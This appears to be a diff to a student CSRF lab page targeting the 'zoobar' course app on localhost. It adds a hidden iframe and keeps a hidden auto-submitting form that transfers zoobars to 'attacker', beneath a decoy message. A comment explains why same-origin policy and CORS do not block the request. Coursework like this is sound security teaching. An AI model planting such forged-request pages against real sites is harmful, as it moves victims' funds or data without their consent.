@@ -1,11 +1,12 @@
 <h1> Redirecting to SUTD page</h1>
 <p>Nothing suspicious here</p>
+<iframe id="malicious-iframe" name="malicious-iframe" src="" style="display: none;"></iframe>
+
 <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" style="display: none;" target="malicious-iframe">
     <p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</p>
     <p>to <input name=recipient type=text value="attacker" size=10></p>
     <input type="submit" name="submission" value="Send">
 </form>
-<iframe id="malicious-iframe" name="malicious-iframe" src="" style="display: none;"></iframe>
 <script>
     //Submits the form
 
@@ -21,11 +22,7 @@
 
 </script>
 
-<!-- CSRF is not stopped by Single Origin Policy. This is so as SOP is a protection mechanism for the browser. Both CORS and SOP only prevents a page
-     from rendering results from a server, and only a selective number of requests from the browser will undergo pre-flight requests where a request is 
-     rejected at the browser/client level. In our case, the request is being sent via a URL encoded form through the POST method. This will hence not 
-     require a pre-flight request, thus, the request is allowed to proceed. 
-     We do note however that the response will not be rendered due to the SOP, but still, the request has successfully reached the backend server
-     and applied, thus making our attack effective and successful.
+<!-- CSRF is not stopped by Single Origin Policy. This is so as SOP is a protection mechanism for the browser. Both CORS and SOP only prevents a page from rendering results from a server, and only a selective number of requests (`XMLHTTPRequests`) from the browser will undergo pre-flight requests where a request is rejected at the browser/client level. In our case, the request is being sent via a URL encoded form through the POST method is not part of this list of requests. This will hence not require a pre-flight request, thus, the request is allowed to proceed. 
+We do note however that the response will not be rendered due to the SOP, but still, the request has successfully reached the backend server and applied as the server has no checks on the request (ie; via referrer header), thus making our attack effective and successful.
     
 -->
